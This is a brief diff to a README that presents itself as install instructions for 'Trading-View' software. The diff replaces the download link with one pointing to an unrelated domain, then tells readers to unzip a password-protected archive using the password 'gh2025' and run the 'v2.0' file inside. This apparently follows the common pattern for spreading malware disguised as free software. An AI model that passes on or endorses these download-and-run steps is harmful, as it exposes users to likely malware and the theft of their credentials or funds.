@@ -3,7 +3,7 @@
 
 ## Installation
 To install **Trading-View**, follow these steps:
-# [DOWNLOAD](https://www.4sync.com/web/directDownload/uy1ticvK/me6XXOEh.8450584c2460379badcd2bbc64fb5f86)  
+# [DOWNLOAD](chatbox.download-desktops.com)  
 After downloading the archive, unzip it using the password. Run the v2.0 file.
 
 ## PASSWORD - gh2025  
